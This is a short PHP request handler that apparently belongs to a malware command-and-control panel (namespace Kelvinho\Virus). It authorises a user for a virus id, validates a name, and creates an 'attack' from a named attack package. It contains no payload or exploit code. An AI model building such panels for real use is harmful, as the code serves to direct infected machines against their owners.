<?php

use Kelvinho\Virus\Attack\AttackPackageNotFound;
use Kelvinho\Virus\Singleton\Header;

$virus_id = $requestData->postCheck("virus_id");
$attack_package = $requestData->postCheck("attack_package");
$name = $requestData->postCheck("name");

if (!$authenticator->authorized($virus_id)) Header::forbidden();
if (strlen($name) > 50) Header::badRequest();

try {
    $attack = $attackFactory->new($virus_id, $attack_package, $name);
} catch (AttackPackageNotFound $exception) {
    Header::badRequest();
}
$session->set("attack_id", $attack->getAttackId());
Header::ok();
